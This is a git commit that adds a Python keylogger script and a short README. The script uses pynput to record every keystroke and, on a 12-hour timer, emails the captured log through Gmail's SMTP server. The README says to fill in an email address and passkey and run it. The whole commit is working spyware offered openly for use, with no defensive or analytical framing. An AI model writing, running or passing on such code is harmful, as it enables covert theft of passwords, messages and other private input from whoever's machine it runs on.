f7b878ee0107efda149b752d5cef2dd64110590b
vrusuware <160102447+vrusuware@users.noreply.github.com>
2025-09-19 06:19:48 +0530

    Add files via upload

---
+++ Key-logger.py
@@ -0,0 +1,44 @@
+#!usr/bin/env python
+from pynput import keyboard
+import threading
+import smtplib
+
+log = ""   #variable to contain the key-presses
+def on_press(key):
+    global log
+    #error handling
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.backspace:
+            log = log[:-1]
+        elif key == key.space:
+            log = log + " "
+        elif key == key.shift or key == key.shift_r or key == key.ctrl_l or key == key.ctrl_r or key == key.left or key == key.right or key == key.up or key == key.down:
+            log = log
+        else:
+            log = log + " " + str(key) + " "
+    #print(log)
+
+def report():
+    global log
+    #print(log)
+    mail()
+    timer = threading.Timer(43200, report)
+    timer.start()
+
+def mail():
+    global log
+    email = "example@gmail.com"
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(email, "passkey")
+    message = log
+    s.sendmail(email, email, message)
+    s.quit()
+
+
+#listener to monitor the keyboard keys
+with keyboard.Listener(on_press=on_press) as listener:
+    report()
+    listener.join()
---
+++ README (1).md
@@ -0,0 +1,2 @@
+1. Change the email and passkey in the code.
+2. Terminal: python <file.py>
